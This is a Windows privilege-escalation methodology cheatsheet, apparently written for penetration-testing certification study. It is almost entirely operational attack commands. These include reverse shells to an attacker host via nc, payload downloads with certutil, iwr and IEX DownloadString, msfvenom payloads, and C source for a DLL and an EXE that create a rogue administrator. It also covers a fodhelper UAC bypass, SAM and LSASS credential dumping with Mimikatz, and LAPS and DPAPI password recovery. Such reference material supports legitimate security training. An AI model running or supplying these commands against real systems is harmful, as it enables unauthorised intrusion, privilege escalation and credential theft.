# Windows Privilege Escalation Methodology

> *Operational Workflow: Shell Stabilization & Context Triage -> Initial Enumeration (Phase 1) -> Vector Identification (Phase 2) -> Targeted Exploitation (Vectors 1-15) -> SYSTEM / Administrative Access*
> *Essential Cheatsheets: [[🪟 windows-commands|Windows Commands]], [[🐢 reverse-shells|Reverse Shells]], [[⛏️ hashcat-john|Hashcat & John]], [[🔧 impacket|Impacket]], [[🔀 ligolo-chisel|Ligolo & Chisel]]*

---

# Phase 1: Initial Enumeration and Context Discovery

> *Execute these discovery commands immediately upon landing a low-privileged Windows shell. Record all outputs in your operational notes.*

### Shell Environment Considerations (CMD vs PowerShell)
Windows interactive shells operate in two primary environments:
- **`cmd.exe`**: Standard command prompt. Use built-in utilities (`dir`, `type`, `whoami`, `net`, `sc`).
- **`powershell.exe`**: Advanced object-oriented environment. Use cmdlets (`Get-ChildItem`, `Get-Content`, `Get-CimInstance`).

If operating inside a restricted `cmd.exe` shell and PowerShell is required:
```cmd
powershell -ep bypass
```

### 1.1: Identity and Token Privileges
```cmd
whoami
whoami /priv            :: CRITICAL: Inspect for SeImpersonate, SeBackup, SeRestore, SeTakeOwnership
whoami /groups          :: Inspect group memberships and Mandatory Integrity Level
net user %username%     :: Detailed user account attributes and group mappings
```

### 1.2: System Architecture and Hotfixes
```cmd
systeminfo              :: Operating system build, architecture, and installed patches
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
```

### 1.3: User Accounts and Administrative Groups
```cmd
net user                :: Enumerate all local accounts
net localgroup          :: Enumerate all local security groups
net localgroup Administrators  :: Enumerate members holding administrative rights
```

### 1.4: Network Interfaces, Routes, and Internal Ports
```cmd
ipconfig /all           :: Network interfaces and domain configuration
route print             :: Routing table and network boundaries
netstat -ano            :: Active TCP/UDP listening services and active connections
arp -a                  :: Address Resolution Protocol cache for adjacent network hosts
```

### 1.5: Active Processes and Windows Services
```cmd
tasklist /SVC           :: All running processes mapped to their respective service names
wmic service list brief :: Comprehensive service listing (name, display name, status, path)
```

### 1.6: Installed Applications and Software
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, DisplayVersion, UninstallString
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, DisplayVersion
Get-Process | Select-Object ProcessName, Path
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

### 1.7: Quick Wins (Stored Passwords and Configuration Secrets)
```cmd
:: Enumerate saved credentials in Windows Credential Manager
cmdkey /list

:: Search configuration files for password patterns
findstr /si "password" *.txt *.ini *.config *.xml

:: Search registry keys for cleartext credentials
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s

:: Enumerate saved Wi-Fi profiles and cleartext pre-shared keys
netsh wlan show profiles
netsh wlan show profile name="WIFI_NAME" key=clear

:: Check for configured AutoLogon credentials in the registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### 1.8: Sensitive File and Post-Exploitation Credential Hunting
Always use the `-Force` flag in PowerShell to uncover hidden directories and files (such as `AppData`):

```powershell
# 1. Search user directories for credentials, documents, and KeePass databases
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx -File -Recurse -Force -ErrorAction SilentlyContinue

# 2. Inspect XAMPP, WAMP, Apache, and MySQL directories for cleartext connection parameters
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.conf,*.properties -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\wamp -Include *.txt,*.ini,*.conf,*.properties -File -Recurse -ErrorAction SilentlyContinue

# 3. Unattended installation artifacts (Sysprep / AutoUnattend)
Get-ChildItem -Path C:\Windows\Panther -Include *.xml,*.inf -File -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\System32\sysprep -Include *.xml,*.inf -File -Recurse -Force -ErrorAction SilentlyContinue

# 4. IIS web server configurations
Get-ChildItem -Path C:\inetpub\wwwroot -Include web.config,appsettings.json -File -Recurse -Force -ErrorAction SilentlyContinue

# 5. Remote administration configuration files (RDCMan, WinSCP, FileZilla, PuTTY, VNC)
Get-ChildItem -Path C:\Users -Include RDCMan.settings,WinSCP.ini,filezilla.xml,recentsessions.xml -File -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ProgramData -Include vnc,ultravnc,tightvnc -File -Recurse -Force -ErrorAction SilentlyContinue

# 6. Windows Sticky Notes database (frequently contains notes with credentials)
Get-ChildItem -Path C:\Users -Include plum.sqlite -File -Recurse -Force -ErrorAction SilentlyContinue
```

> 💡 **Handling UTF-16 Log Files:**
> Windows log files are frequently encoded in UTF-16 Little Endian, causing Linux utilities like `grep` to treat them as binary. Convert them to UTF-8 before analysis:
> ```bash
> iconv -f UTF-16 -t UTF-8 target.log -o target_utf8.txt
> grep -i "password" target_utf8.txt
> ```

### 1.9: PowerShell Command History Analysis
The PowerShell command history file is the Windows equivalent of `.bash_history`. Administrators frequently execute administrative scripts or create accounts with cleartext credentials in this log:

```powershell
# Check PowerShell history across all user profiles (if read permissions exist)
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "=== $($_.FullName) ===" -ForegroundColor Yellow; Get-Content $_ }

# Direct inspection via cmd.exe
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Inspect current session history
Get-History
(Get-PSReadlineOption).HistorySavePath
type (Get-PSReadlineOption).HistorySavePath
```

### 1.10: PowerShell Event Logs and Script Block Logging
When PowerShell Script Block Logging (Event ID 4104) is enabled, execution logs store script bodies and parameters in event logs:
```powershell
# Extract executed script blocks containing credential keywords
Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational -ErrorAction SilentlyContinue | `
    Where-Object {$_.Id -eq 4104} | `
    ForEach-Object { $_.Message -split '\r?\n' } | `
    Where-Object { $_ -notmatch "__cmdletization" } | `
    Select-String -Pattern "password|admin|cred|secret"

# Review recent successful interactive logons (Event ID 4624)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 20 -ErrorAction SilentlyContinue | `
    Select-Object TimeCreated, @{Name='User';Expression={$_.Properties[5].Value}} | `
    Where-Object {$_.User -notmatch "SYSTEM|NETWORK SERVICE|LOCAL SERVICE|\$"}

# Inspect Windows Defender threat detections (Event ID 1116) to verify if payloads were blocked
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -ErrorAction SilentlyContinue | `
    Where-Object {$_.Id -eq 1116} | `
    Select-Object TimeCreated, Message | Format-List
```

---

# Phase 2: Privilege Escalation Vectors

> *Triage Matrix: Select the corresponding escalation vector based on your initial enumeration findings.*

| Observed System Finding | Target Escalation Vector |
| --- | --- |
| `SeImpersonatePrivilege` or `SeAssignPrimaryToken` Enabled | [[#Vector 1: Token Impersonation (Potato Family)]] |
| `SeBackupPrivilege` or `SeRestorePrivilege` Enabled | [[#Vector 2: SeBackupPrivilege and Registry Hive Dumping]] |
| Unquoted service path discovered in non-standard software | [[#Vector 3: Unquoted Service Paths]] |
| Writable service binary executable file | [[#Vector 4: Service Binary Hijacking]] |
| Writable registry key under `HKLM\SYSTEM\CurrentControlSet\Services` | [[#Vector 5: Service Registry Key Hijacking]] |
| `AlwaysInstallElevated` set to `0x1` in both HKCU and HKLM | [[#Vector 6: AlwaysInstallElevated]] |
| Scheduled task running with elevated rights and writable binary | [[#Vector 7: Scheduled Tasks]] |
| Writable directory in application path or missing DLL dependency | [[#Vector 8: DLL Hijacking]] |
| Cached user credentials in `cmdkey /list` | [[#Vector 9: Saved Credentials and runas]] |
| Legacy Windows build with missing security hotfixes | [[#Vector 10: Kernel Exploits]] |
| Management daemon bound to `127.0.0.1` | [[#Vector 11: Internal Services Port Forwarding]] |
| Member of Administrators group running in Medium Integrity | [[#Vector 12: User Account Control (UAC) Bypass]] |
| Writable Start Menu Startup directory | [[#Vector 13: Startup Folder Hijacking]] |
| Local Administrator Password Solution (LAPS) deployed in Active Directory | [[#Vector 14: LAPS (Local Administrator Password Solution)]] |
| DPAPI protected credential blobs stored on disk | [[#Vector 15: DPAPI Credential Recovery]] |

---

## Vector 1: Token Impersonation (Potato Family)

> *The premier Windows privilege escalation vector in the OSCP syllabus. If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled on your token, instant SYSTEM access is achievable.*
>
> **Operating System Mechanics:**
> Windows Access Tokens represent security contexts assigned to processes and threads:
> - **Primary Tokens:** Define the primary security identity under which a process executes.
> - **Impersonation Tokens:** Allow a thread to temporarily assume the security context of a client to access local or remote resources.
>
> Service accounts (IIS `iis apppool\defaultapppool`, MSSQL `NT SERVICE\MSSQLSERVER`, Jenkins) are designed to handle incoming client requests and are granted `SeImpersonatePrivilege` by default.
>
> **The 3-Step Potato Exploitation Framework:**
> 1. **Coercion:** Force an elevated process running as `NT AUTHORITY\SYSTEM` (such as the Print Spooler or RPCSS) to connect to a local transport endpoint.
> 2. **Capture:** Listen on a controlled local Named Pipe or COM endpoint. When SYSTEM authenticates, intercept its Impersonation Token.
> 3. **Impersonation:** With `SeImpersonatePrivilege`, call `CreateProcessWithTokenW()` or `CreateProcessAsUserW()` to launch an arbitrary command with the captured SYSTEM token.

### Verification
```cmd
whoami /priv
```
Look for:
- `SeImpersonatePrivilege` -> **Enabled**
- `SeAssignPrimaryTokenPrivilege` -> **Enabled**

### Tool Selection Matrix
| Tool | Target OS Compatibility | Standard Syntax |
| --- | --- | --- |
| **SigmaPotato** | All Windows Desktop & Server versions | `.\SigmaPotato.exe "command"` |
| **PrintSpoofer** | Windows 10, Server 2016, Server 2019 | `PrintSpoofer.exe -i -c cmd` |
| **GodPotato** | All modern Windows versions (RPCSS OXID resolution) | `GodPotato.exe -cmd "cmd /c whoami"` |
| **JuicyPotato** | Windows 7, 8.1, Server 2008 R2, Server 2012 | `JuicyPotato.exe -l 1337 -p cmd.exe -t *` |
| **SweetPotato** | Combined engine (PrintSpoofer + DCOM + EfsPotato) | `SweetPotato.exe -a "command"` |

### Exploitation Snippets

#### SigmaPotato (Universal Compatibility):
```powershell
# Transfer and execute SigmaPotato
iwr -uri "http://[KALI_IP]/SigmaPotato.exe" -OutFile SigmaPotato.exe

# Method A: Add a new local administrator account
.\SigmaPotato.exe "net user attacker Password123! /add"
.\SigmaPotato.exe "net localgroup Administrators attacker /add"

# Method B: Enable remote token authentication for local administrators
.\SigmaPotato.exe "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"

# Method C: Execute a direct reverse shell
.\SigmaPotato.exe "C:\Temp\nc.exe [KALI_IP] 4444 -e cmd.exe"
```

#### PrintSpoofer (Clean Named Pipe Spoofing on Windows 10 and Server 2016-2019):
```cmd
certutil -urlcache -split -f http://[KALI_IP]/PrintSpoofer.exe C:\Temp\PrintSpoofer.exe
C:\Temp\PrintSpoofer.exe -c "C:\Temp\nc.exe [KALI_IP] 4444 -e cmd.exe"
```

#### GodPotato (Bypasses DCOM hardening using RPCSS):
```cmd
certutil -urlcache -split -f http://[KALI_IP]/GodPotato.exe C:\Temp\GodPotato.exe
C:\Temp\GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe [KALI_IP] 4444 -e cmd.exe"
```

> 💡 **Potato Troubleshooting Tips:**
> - If an exploit fails silently, check whether the Print Spooler service is running: `sc query spooler`. If stopped, switch to GodPotato.
> - If executable binaries are quarantined by Windows Defender, compile the standalone .NET source code of GodPotato or use PowerShell in-memory reflections.

---

## Vector 2: SeBackupPrivilege and Registry Hive Dumping

> *`SeBackupPrivilege` and `SeRestorePrivilege` grant processes read and write access to all files on the filesystem, completely bypassing NTFS Access Control Lists (ACLs).*
>
> **Operating System Mechanics:**
> When opening a file handle using `CreateFile()`, passing the `FILE_FLAG_BACKUP_SEMANTICS` flag instructs the Windows Security Reference Monitor (SRM) to ignore file DACLs if the calling token holds `SeBackupPrivilege`.
>
> While `C:\Windows\System32\config\SAM` and `SYSTEM` are locked by the kernel during system runtime, `reg save` delegates extraction to the Registry Service in memory, writing the hives to disk without locking conflicts.

### Verification
```cmd
whoami /priv
:: Look for: SeBackupPrivilege -> Enabled
```

### Exploitation
```cmd
:: Export SAM and SYSTEM registry hives
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

:: Transfer SAM and SYSTEM files to Kali (via SMB, certutil, or HTTP)
```

```bash
# On Kali: Extract local NTLM password hashes using secretsdump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
NTLM hashes can be cracked offline via Hashcat or used directly in Pass-the-Hash attacks (`impacket-psexec` or `evil-winrm`).

#### Alternative: Volume Shadow Copy Service (VSS):
If locked files cannot be exported via `reg save`, create a volume snapshot:
```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

---

## Vector 3: Unquoted Service Paths

> *When a Windows service executable path contains spaces and is not enclosed within double quotes, the service manager attempts to execute intermediate path components.*
>
> **Operating System Mechanics:**
> When the Service Control Manager invokes `CreateProcess()` without quotes around a path containing spaces:
> For path: `C:\Program Files\Custom App\Service.exe`, Windows interprets spaces as argument delimiters and searches sequentially:
> 1. `C:\Program.exe`
> 2. `C:\Program Files\Custom.exe`
> 3. `C:\Program Files\Custom App\Service.exe`
>
> If your current user holds write permissions in any intermediate directory (e.g., `C:\Program Files\`), dropping a malicious executable named `Custom.exe` results in SYSTEM execution upon service restart.

### Verification
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
```

### Exploitation
```powershell
# 1. Audit write permissions on each intermediate path component
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Custom App"
# Look for: (W) Write, (M) Modify, or (F) Full Control granted to BUILTIN\Users or your account
```

```cmd
:: 2. Drop malicious payload matching the split path
:: On Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f exe > Custom.exe
certutil -urlcache -split -f http://[KALI_IP]/Custom.exe "C:\Program Files\Custom.exe"

:: 3. Restart the service (or reboot the target machine)
sc stop "CustomService"
sc start "CustomService"
```

---

## Vector 4: Service Binary Hijacking

> *If an account has Modify or Write permissions on a service executable or its parent directory, replace the binary directly with a custom payload.*

### Verification
```powershell
# Enumerate all running services and executable paths
Get-CimInstance -ClassName win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -eq 'Running'}

# Audit permissions on the target service binary
icacls "C:\Program Files\Vulnerable App\service.exe"
# Check if current user or BUILTIN\Users possesses (M), (F), or (W) permissions
```

### Exploitation
```c
// Save as adduser.c on Kali
#include <stdlib.h>

int main() {
    system("net user attacker Password123! /add");
    system("net localgroup administrators attacker /add");
    return 0;
}
```

```bash
# Cross-compile for Windows target on Kali
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```powershell
# On Target: Replace the original binary with your payload
move "C:\Program Files\Vulnerable App\service.exe" "C:\Program Files\Vulnerable App\service.exe.bak"
iwr -uri "http://[KALI_IP]/adduser.exe" -OutFile "C:\Program Files\Vulnerable App\service.exe"

# Restart the service
net stop VulnerableService && net start VulnerableService
```

---

## Vector 5: Service Registry Key Hijacking

> *Windows services store configuration, startup behavior, and executable binary paths in the registry. If permissions permit modifying the service's registry key, change its `ImagePath`.*

### Verification
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services\[SERVICE_NAME]
```

### Exploitation
```cmd
:: Overwrite the service binary path (ImagePath) to point to your reverse shell
reg add HKLM\SYSTEM\CurrentControlSet\Services\[SERVICE_NAME] /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\nc.exe [KALI_IP] 4444 -e cmd.exe" /f

:: Restart the service
sc stop [SERVICE_NAME]
sc start [SERVICE_NAME]
```

---

## Vector 6: AlwaysInstallElevated

> *If the `AlwaysInstallElevated` policy is enabled in both Machine and User registry hives, the Windows Installer executes `.msi` packages with `NT AUTHORITY\SYSTEM` privileges.*

### Verification
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both queries MUST return 0x1 for exploitation to succeed
```

### Exploitation
```bash
# On Kali: Generate a malicious MSI package
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f msi -o setup.msi
```

```cmd
:: On Target: Execute silent elevated installation
msiexec /quiet /qn /i C:\Temp\setup.msi
```

---

## Vector 7: Scheduled Tasks

> *Scheduled tasks executing as SYSTEM or administrative users can be hijacked if their executable file or enclosing directory is writable.*

### Verification
```powershell
# Enumerate scheduled tasks executing under elevated accounts
Get-ScheduledTask | ForEach-Object { 
    $task = $_; 
    $_.Actions | Select-Object @{Name='TaskName';Expression={$task.TaskName}}, 
                                @{Name='TaskPath';Expression={$task.TaskPath}}, 
                                @{Name='RunAs';Expression={$task.Principal.UserId}}, 
                                @{Name='Execute';Expression={$_.Execute}}, 
                                @{Name='Arguments';Expression={$_.Arguments}} 
} | Where-Object { $_.Execute -and $_.RunAs -match "SYSTEM|Administrator" } | Format-List
```

### Exploitation
```powershell
# Audit permissions on the scheduled executable
icacls "C:\Tasks\maintenance.exe"

# If writable, replace with reverse shell binary
move "C:\Tasks\maintenance.exe" "C:\Tasks\maintenance.exe.bak"
iwr -uri "http://[KALI_IP]/shell.exe" -OutFile "C:\Tasks\maintenance.exe"

# Wait for scheduled execution or trigger manually if permissions allow
```

---

## Vector 8: DLL Hijacking

> *When a Windows application loads a dynamic-link library (DLL) without specifying an absolute path, Windows searches directories in a strict order (`SafeDllSearchMode`). Placing a malicious DLL in an earlier, writable directory triggers code execution upon application startup.*
>
> **Standard Windows DLL Search Order:**
> 1. Application directory (where the `.exe` resides)
> 2. `C:\Windows\System32`
> 3. `C:\Windows\System`
> 4. `C:\Windows`
> 5. Current working directory
> 6. Directories enumerated in the system `%PATH%`

### Verification
```powershell
# Identify writable directories inside the system %PATH%
$env:Path -split ';' | ForEach-Object {
    $dir = $_.Trim()
    if ($dir -and (Test-Path $dir)) {
        $acl = (icacls $dir) | Out-String
        if ($acl -match "BUILTIN\\Users.*\(W\)|BUILTIN\\Users.*\(M\)|BUILTIN\\Users.*\(F\)|Everyone.*\(W\)|Everyone.*\(M\)") {
            Write-Host "[VULNERABLE] Writable PATH directory: $dir" -ForegroundColor Red
        }
    }
}
```

### Exploitation
```c
// Save as malicious_dll.c on Kali
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("net user attacker Password123! /add");
        system("net localgroup administrators attacker /add");
    }
    return TRUE;
}
```

```bash
# Compile shared library on Kali
x86_64-w64-mingw32-gcc malicious_dll.c --shared -o TargetDLL.dll

# Alternatively, generate reverse shell DLL directly using msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f dll -o TargetDLL.dll
```

```powershell
# On Target: Drop DLL into writable application folder or PATH location
iwr -uri "http://[KALI_IP]/TargetDLL.dll" -OutFile "C:\Program Files\App\TargetDLL.dll"
# Restart the corresponding service or wait for application launch
```

---

## Vector 9: Saved Credentials and runas

> *When credentials are saved in the Windows Credential Manager (`cmdkey`), commands can be spawned in the context of the cached account.*

### Verification
```cmd
cmdkey /list
:: Inspect entries for stored credentials: Target: TERMSRV/... or Domain:target=...
```

### Exploitation
```cmd
:: Execute command using stored credentials without supplying password
runas /savecred /user:Administrator "C:\Temp\nc.exe [KALI_IP] 4444 -e cmd.exe"
```

---

## Vector 10: Kernel Exploits

> ⚠️ **Caution: Last Resort.** Kernel exploits risk producing Blue Screen of Death (BSOD) crashes. On timed certification exams, verify OS build numbers and patch levels meticulously.

### Verification
```cmd
systeminfo
:: Record exact OS Name, Version, and list of installed Hotfixes (KBs)
```

### High-Yield Windows Kernel Vulnerabilities
| Operating System Range | Reference | Description |
| --- | --- | --- |
| **Windows 7 / Server 2008 R2** | MS11-046 | Ancillary Function Driver (`afd.sys`) Elevation |
| **Windows 7 - 10 / Server 2008 - 2016** | MS16-032 | Secondary Logon Handle Leak |
| **Windows 10 (1803 - 1903)** | CVE-2019-1388 | UAC Certificate Dialog Privilege Escalation |
| **Windows 10 / Server 2019 - 2022** | CVE-2021-1732 | Windows Win32k Elevation of Privilege |

---

## Vector 11: Internal Services Port Forwarding

> *Internal database daemons (MSSQL, MySQL) or administrative web consoles frequently bind exclusively to `127.0.0.1`.*

### Verification
```cmd
netstat -ano | findstr "LISTENING"
:: Look for 127.0.0.1:PORT entries (e.g., 3306, 1433, 8080)
```

### Exploitation
Forward the local port to your Kali machine using Chisel:
```bash
# On Kali: Start Chisel reverse listener
chisel server -p 8000 --reverse

# On Target: Connect to Kali and expose local port 3306
chisel.exe client [KALI_IP]:8000 R:3306:127.0.0.1:3306
```
> *See the [[🔀 ligolo-chisel|Ligolo and Chisel Cheatsheet]] for complete pivoting and tunneling techniques.*

---

## Vector 12: User Account Control (UAC) Bypass

> *When a local administrator account is logged in, Windows assigns a Filtered Token running at Medium Mandatory Integrity. Bypassing UAC elevates execution to High Integrity without triggering interactive prompts.*
>
> **Operating System Mechanics:**
> Windows auto-elevates certain signed Microsoft executables (such as `fodhelper.exe`, `computerdefaults.exe`, `sdclt.exe`) based on their application manifest (`autoElevate=true`). Manipulating registry keys parsed by these binaries executes commands at High Mandatory Integrity.

### Verification
```cmd
:: Verify if user is an Administrator operating under Medium Integrity
whoami /groups | findstr /i "S-1-16-8192"
:: S-1-16-8192 indicates Medium Mandatory Level (UAC active)
```

### Exploitation (fodhelper.exe Method)
```cmd
:: 1. Register command execution registry keys under HKCU (no admin privileges needed)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Temp\nc.exe [KALI_IP] 4444 -e cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f

:: 2. Launch fodhelper.exe to trigger auto-elevation and execute payload
fodhelper.exe

:: 3. Clean up registry keys from the resulting elevated shell
reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f
```

---

## Vector 13: Startup Folder Hijacking

> *Programs or shortcuts placed in the All Users Startup directory execute automatically in the security context of any user who logs into the system.*

### Verification
```powershell
# Audit permissions on the All Users Startup folder
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# Check if BUILTIN\Users has (W), (M), or (F) permissions
```

### Exploitation
```powershell
# Place malicious executable in Startup directory
iwr -uri "http://[KALI_IP]/shell.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
# Await administrator interactive logon or system reboot
```

---

## Vector 14: LAPS (Local Administrator Password Solution)

> *Microsoft LAPS randomizes the local administrator password of domain-joined machines and stores the plaintext password directly in an Active Directory computer attribute (`ms-Mcs-AdmPwd`).*

### Verification
```powershell
# Check if LAPS client extension is present on the machine
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll' -ErrorAction SilentlyContinue

# Enumerate LAPS password attribute using PowerView from a domain user session
Get-DomainComputer | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object Name, 'ms-Mcs-AdmPwd'
```

### Exploitation
```powershell
# Query LAPS password using Active Directory module
Get-ADComputer -Identity [TARGET_COMPUTER] -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd
```

```bash
# Query LAPS passwords from Kali using NetExec / CrackMapExec
netexec ldap [DC_IP] -u [USER] -p [PASSWORD] --module laps
```
Log in using recovered credentials:
```bash
evil-winrm -i [TARGET_IP] -u Administrator -p '[DISCOVERED_LAPS_PASSWORD]'
```

---

## Vector 15: DPAPI Credential Recovery

> *The Windows Data Protection API (DPAPI) encrypts application passwords (such as stored RDP sessions, browser credentials, and Windows Vault secrets) using master keys derived from user passwords.*

### Verification
```powershell
# Enumerate stored credentials in Windows Vault
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all

# Locate user DPAPI Master Key stores
dir C:\Users\*\AppData\Roaming\Microsoft\Protect\ /s /b
dir C:\Users\*\AppData\Local\Microsoft\Credentials\ /s /b
```

### Exploitation via Mimikatz (Requires SYSTEM or User Credentials)
```cmd
:: Launch Mimikatz
privilege::debug
token::elevate

:: List DPAPI credential blobs
dpapi::cred /in:C:\Users\[USER]\AppData\Local\Microsoft\Credentials\[GUID]

:: Decrypt master key using RPC call to Domain Controller (as SYSTEM)
dpapi::masterkey /in:C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\[SID]\[GUID] /rpc

:: Decrypt credential blob using recovered master key
dpapi::cred /in:C:\Users\[USER]\AppData\Local\Microsoft\Credentials\[GUID] /masterkey:[MASTERKEY_HEX]
```

---

# Phase 3: Switching User Contexts in Non-Interactive Shells

Standard `runas.exe` is interactive and prompts for passwords on stdin, which fails inside basic NetCat reverse shells. Use PowerShell's `PSCredential` object to spawn independent processes:

```powershell
# Spawn a secondary reverse shell under a different user identity
$secpasswd = ConvertTo-SecureString "[PASSWORD]" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("[USERNAME]", $secpasswd)

# Execute reverse shell pointing to a secondary listener port on Kali (e.g., 4445)
Start-Process -FilePath "C:\Temp\nc.exe" -ArgumentList "[KALI_IP] 4445 -e cmd.exe" -Credential $creds
```

---

# Phase 4: Credential Dumping with Mimikatz

When operating with administrative or `SYSTEM` privileges, harvest credentials from LSASS and local SAM:

```cmd
:: Enable debug privilege and elevate token
privilege::debug
token::elevate

:: Dump local SAM database hashes
lsadump::sam

:: Extract plaintext passwords and hashes from LSASS memory
sekurlsa::logonpasswords
```
> *NTLM hashes extracted from SAM can be passed directly via Pass-the-Hash: `impacket-psexec -hashes :[NTLM_HASH] Administrator@[TARGET_IP]`.*

---

# Phase 5: Automated Enumeration Tools

> *Execute automated audit scripts only AFTER completing initial targeted manual verification.*

### winPEAS
```cmd
:: Download and execute winPEAS binary
certutil -urlcache -split -f http://[KALI_IP]/winPEASx64.exe C:\Temp\winpeas.exe
C:\Temp\winpeas.exe

:: Execute winPEAS in-memory via PowerShell
IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/winPEAS.ps1')
```

### PowerUp
```powershell
# Bypass execution policy and dot-source PowerUp
powershell -ep bypass
. .\PowerUp.ps1

# Run automated service and registry checks
Invoke-AllChecks
```

---

# Phase 6: WinPEAS Output Decision Tree and Triage Priority

Follow this prioritization matrix when analyzing winPEAS results:

```
                        ┌─────────────────────┐
                        │   WINPEAS FINDINGS  │
                        │ (or manual checks)  │
                        └─────────┬───────────┘
                                  │
              ┌───────────────────┼───────────────────┐
              ▼                   ▼                   ▼
     ┌────────────────┐  ┌────────────────┐  ┌────────────────┐
     │ PRIVILEGES     │  │ SERVICES       │  │ CREDENTIALS    │
     │ (whoami /priv) │  │ (wmic/sc)      │  │ (files/reg)    │
     └───────┬────────┘  └───────┬────────┘  └───────┬────────┘
             │                   │                   │
    ┌────────┴────────┐  ┌──────┴───────┐   ┌───────┴──────────┐
    ▼                 ▼  ▼              ▼   ▼                  ▼
SeImpersonate   SeBackup  Unquoted   Binary  cmdkey/list    Passwords
    │               │     Path      Writable     │         in files
    ▼               ▼       │           │        ▼             │
SigmaPotato    reg save     │           │   runas /savecred    ▼
PrintSpoofer   SAM/SYSTEM   ▼           ▼                  Test them!
GodPotato      secretsdump Place .exe  Replace .exe        PSCredential
    │               │      in gap      + restart
    ▼               ▼       │           │
  SYSTEM!        Hashes     ▼           ▼
              -> PtH/Crack  SYSTEM!    SYSTEM!


        ┌─────────────────────────────────────────┐
        │            OTHER VECTORS                │
        └─────────────┬───────────────────────────┘
                      │
     ┌────────┬───────┼────────┬──────────┐
     ▼        ▼       ▼        ▼          ▼
  Admin     Always  DLL      Startup   Scheduled
  Medium    Install Missing  Folder    Task
  Integrity Elevated  │     Writable  Writable
     │        │       │        │          │
     ▼        ▼       ▼        ▼          ▼
   UAC      msfvenom Create  Place     Replace
   Bypass   .msi    DLL in   payload   task binary
   fodhelper msiexec  PATH     │          │
     │        │       │        ▼          ▼
     ▼        ▼       ▼     Wait for   Wait for
  High      SYSTEM! SYSTEM! next login execution
  Integrity
  Token!


        ┌─────────────────────────────────────────┐
        │       DOMAIN & ADVANCED VECTORS         │
        └─────────────┬───────────────────────────┘
                      │
           ┌──────────┼──────────┐
           ▼          ▼          ▼
         LAPS       DPAPI     Kernel
         Enabled?   Blobs?    Legacy OS?
           │          │          │
           ▼          ▼          ▼
        Read        Mimikatz  windows-exploit
        ms-Mcs-     dpapi::   -suggester
        AdmPwd      masterkey    │
           │          │          ▼
           ▼          ▼       Compile
        Admin PW   Recovered  & run
        plaintext  passwords  exploit
```

---

# Phase 7: Quick Reference Windows Privilege Escalation Checklist

```
☐ whoami /priv                          -> SeImpersonate? -> SigmaPotato / PrintSpoofer
☐ whoami /groups                        -> Am I admin? (Medium Integrity) -> UAC Bypass (fodhelper)
